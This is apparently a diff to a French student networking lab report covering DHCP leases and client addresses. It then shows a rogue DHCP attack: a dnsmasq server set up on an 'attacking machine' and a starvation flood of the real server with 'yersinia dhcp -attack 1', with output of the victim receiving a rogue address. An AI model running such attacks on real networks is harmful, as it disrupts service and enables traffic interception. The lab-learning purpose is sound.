@@ -338,3 +338,113 @@ PING google.com (172.217.20.206) 56(84) bytes of data.
 64 bytes from waw02s08-in-f14.1e100.net (172.217.20.206): icmp_seq=2 ttl=112 time=117 ms
 64 bytes from waw02s08-in-f14.1e100.net (172.217.20.206): icmp_seq=3 ttl=112 time=71.2 ms
 ```
+
+☀️ Consultez le bail DHCP qui a été créé pour notre client
+
+(Il y a deux IP car j'avais redemandé une IP avant d'aller voir le bail)
+```
+[durian@routeur ~]$ cat /var/lib/dhcpd/dhcpd.leases
+# The format of this file is documented in the dhcpd.leases(5) manual page.
+# This lease file was written by isc-dhcp-4.4.2b1
+
+# authoring-byte-order entry is generated, DO NOT DELETE
+authoring-byte-order little-endian;
+
+lease 10.5.1.201 {
+  starts 1 2024/10/14 15:50:13;
+  ends 1 2024/10/14 16:00:13;
+  tstp 1 2024/10/14 16:00:13;
+  cltt 1 2024/10/14 15:50:13;
+  binding state free;
+  hardware ethernet 08:00:27:a0:86:f3;
+  uid "\001\010\000'\240\206\363";
+}
+lease 10.5.1.200 {
+  starts 1 2024/10/14 16:02:21;
+  ends 1 2024/10/14 16:12:21;
+  tstp 1 2024/10/14 16:12:21;
+  cltt 1 2024/10/14 16:02:21;
+  binding state free;
+  hardware ethernet 08:00:27:a0:86:f3;
+  uid "\377\3424?>\000\002\000\000\253\021\021=\274\210Y\341=t";
+}
+server-duid "\000\001\000\001.\237\367\262\010\000'\214\225\355";
+```
+
+☀️ Confirmez qu'il s'agit bien de la bonne adresse MAC
+
+```
+dorian@client3:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:a0:86:f3 brd ff:ff:ff:ff:ff:ff
+    inet 10.5.1.200/24 metric 100 brd 10.5.1.255 scope global dynamic enp0s3
+       valid_lft 506sec preferred_lft 506sec
+    inet6 fe80::a00:27ff:fea0:86f3/64 scope link
+       valid_lft forever preferred_lft forever
+```
+
+☀️ Installer et configurer un serveur DHCP sur la machine attaquante
+
+```
+sudo apt install dnsmasq
+sudo mv /etc/dnsmasq.conf  /etc/dnsmasq.conf.ori
+
+root@client1:~# cat /etc/dnsmasq.conf
+log-dhcp
+dhcp-range=10.5.1.240,10.5.1.250,12h
+dhcp-option=option:netmask,255.255.255.0
+dhcp-option=option:router,10.5.1.254
+dhcp-option=option:dns-server,1.1.1.1
+port=69
+
+sudo systemctl enable dnsmasq
+```
+
+☀️ Depuis un autre client, demander un adresse IP en DHCP
+
+```
+dorian@client2:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:92:4d:ba brd ff:ff:ff:ff:ff:ff
+    inet 10.5.1.137/24 brd 10.5.1.255 scope global dynamic enp0s3
+       valid_lft 420sec preferred_lft 420sec
+    inet6 fe80::a00:27ff:fe92:4dba/64 scope link
+       valid_lft forever preferred_lft forever
+```
+C'est une adresse du vrai serveur DHCP
+
+☀️ Pour que ça marche mieux, il faut flood le serveur DHCP réel
+
+```
+sudo apt install yersinia
+sudo yersinia dhcp -attack 1 -interface enp0s3
+```
+Quand on refait une demande DHCP avec la victime on a :
+```
+dorian@client2:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:92:4d:ba brd ff:ff:ff:ff:ff:ff
+    inet 10.5.1.240/24 brd 10.5.1.255 scope global dynamic enp0s3
+       valid_lft 43167sec preferred_lft 43167sec
+    inet6 fe80::a00:27ff:fe92:4dba/64 scope link
+       valid_lft forever preferred_lft forever
+```
+
